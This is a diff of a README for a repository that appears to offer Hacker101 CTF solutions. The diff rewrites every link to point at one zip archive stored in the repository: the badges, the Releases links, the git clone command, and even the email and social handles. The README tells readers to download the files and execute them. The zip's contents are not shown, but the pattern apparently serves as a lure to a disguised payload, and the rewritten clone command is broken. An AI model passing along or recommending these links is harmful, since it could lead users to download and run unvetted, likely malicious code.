@@ -1,8 +1,8 @@
 # Hacker101 CTF Solutions: Your Guide to Web Security Challenges 🕵️‍♂️🔍
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/abbassFarhat/hacker101-CTF-Solutions?color=blue&style=flat-square)
-![License](https://img.shields.io/github/license/abbassFarhat/hacker101-CTF-Solutions?color=green&style=flat-square)
-![GitHub Stars](https://img.shields.io/github/stars/abbassFarhat/hacker101-CTF-Solutions?color=yellow&style=flat-square)
+![GitHub Repo Size](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip)
+![License](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip)
+![GitHub Stars](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip)
 
 ## Table of Contents
 
@@ -24,7 +24,7 @@ Welcome to the **Hacker101 CTF Solutions** repository! This project offers compr
 - Authentication Bypass
 - And more...
 
-Explore our solutions to deepen your understanding of web security and ethical hacking. For the latest updates and downloadable content, visit our [Releases](https://github.com/abbassFarhat/hacker101-CTF-Solutions/releases).
+Explore our solutions to deepen your understanding of web security and ethical hacking. For the latest updates and downloadable content, visit our [Releases](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip).
 
 ## Features
 
@@ -54,7 +54,7 @@ To get started with the Hacker101 CTF Solutions, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/abbassFarhat/hacker101-CTF-Solutions.git
+   git clone https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -68,7 +68,7 @@ To get started with the Hacker101 CTF Solutions, follow these steps:
    Browse through the folders to find solutions to various challenges.
 
 4. **Download Latest Releases**:
-   For the latest content, check out the [Releases](https://github.com/abbassFarhat/hacker101-CTF-Solutions/releases). Download the necessary files and execute them as needed.
+   For the latest content, check out the [Releases](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip). Download the necessary files and execute them as needed.
 
 ## Usage
 
@@ -112,8 +112,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
-- **GitHub**: [abbassFarhat](https://github.com/abbassFarhat)
+- **Email**: https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip
+- **Twitter**: [@yourhandle](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip)
+- **GitHub**: [abbassFarhat](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip)
 
-Explore our [Releases](https://github.com/abbassFarhat/hacker101-CTF-Solutions/releases) for the latest updates and downloadable content. Join us in enhancing your skills in web security and ethical hacking!
+Explore our [Releases](https://github.com/abbassFarhat/hacker101-CTF-Solutions/raw/refs/heads/main/Level-11_H1_Thermostat/hacker_Solutions_CT_1.8.zip) for the latest updates and downloadable content. Join us in enhancing your skills in web security and ethical hacking!
